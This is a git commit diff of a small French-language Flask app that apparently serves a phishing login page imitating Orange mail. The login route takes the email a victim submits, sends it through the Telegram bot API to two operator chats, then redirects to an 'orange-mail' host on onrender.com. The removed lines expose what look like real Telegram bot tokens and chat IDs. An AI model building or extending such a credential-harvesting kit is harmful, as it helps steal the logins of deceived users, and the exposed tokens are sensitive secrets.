8e1f1ac58b93af1684741d6c21b0955e0ff8e4f4
escobar25250616 <etoilebonne033@gmail.com>
2025-05-26 01:44:28 +0200

    Initial commit - Flask login app with Telegram integration

--- app.py
+++ app.py
@@ -1,37 +1,38 @@
+from dotenv import load_dotenv
+load_dotenv()
+
 from flask import Flask, request, redirect, render_template
 import requests
 import os
 
 app = Flask(__name__)
 
-# Remplace par tes vraies infos
-BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
-CHAT_ID = "6297861735"
+BOT_TOKEN_1 = os.getenv("TELEGRAM_BOT_TOKEN_1")
+CHAT_ID_1 = os.getenv("TELEGRAM_CHAT_ID_1")
+BOT_TOKEN_2 = os.getenv("TELEGRAM_BOT_TOKEN_2")
+CHAT_ID_2 = os.getenv("TELEGRAM_CHAT_ID_2")
 
-BOT_TOKEN = "8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs"
-CHAT_ID = "7650873997"
+def envoyer_telegram(bot_token, chat_id, message):
+    try:
+        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+        params = {"chat_id": chat_id, "text": message}
+        r = requests.get(url, params=params)
+        print(f"Envoi à {chat_id} -> Status: {r.status_code}")
+        print(r.text)
+    except Exception as e:
+        print(f"Erreur envoi vers {chat_id} :", e)
 
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        email = request.form['email']
-
+        email = request.form.get('email')
         message = f"🔐 Nouvelle tentative d'identification\n📧 Adresse: {email}"
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        params = {
-            "chat_id": CHAT_ID,
-            "text": message
-        }
-        try:
-            requests.get(url, params=params)
-        except Exception as e:
-            print("Erreur Telegram:", e)
 
-        return redirect("https://orange-mail-k3rh.onrender.com/")
+        envoyer_telegram(BOT_TOKEN_1, CHAT_ID_1, message)
+        envoyer_telegram(BOT_TOKEN_2, CHAT_ID_2, message)
 
+        return redirect("https://orange-mail-1.onrender.com/")
     return render_template('login.html')
 
-
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(debug=True)
